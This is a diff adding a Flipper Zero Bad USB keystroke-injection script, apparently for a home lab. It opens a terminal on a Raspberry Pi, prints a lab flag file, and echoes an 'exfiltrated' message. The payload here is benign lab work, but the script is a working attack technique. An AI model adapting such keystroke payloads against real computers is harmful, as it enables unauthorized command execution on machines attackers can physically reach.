@@ -1,0 +1,15 @@
+REM Flipper Zero Bad USB — exfil flag.txt to terminal
+REM Plug Flipper into Pi USB. Opens a terminal and cats the flag.
+REM Target: Raspberry Pi running flipper-lab server
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING lxterminal
+ENTER
+DELAY 1000
+STRING cat /home/levimackay/flipper-lab/server/flag.txt
+ENTER
+DELAY 500
+STRING echo "[FLIPPER] flag exfiltrated"
+ENTER
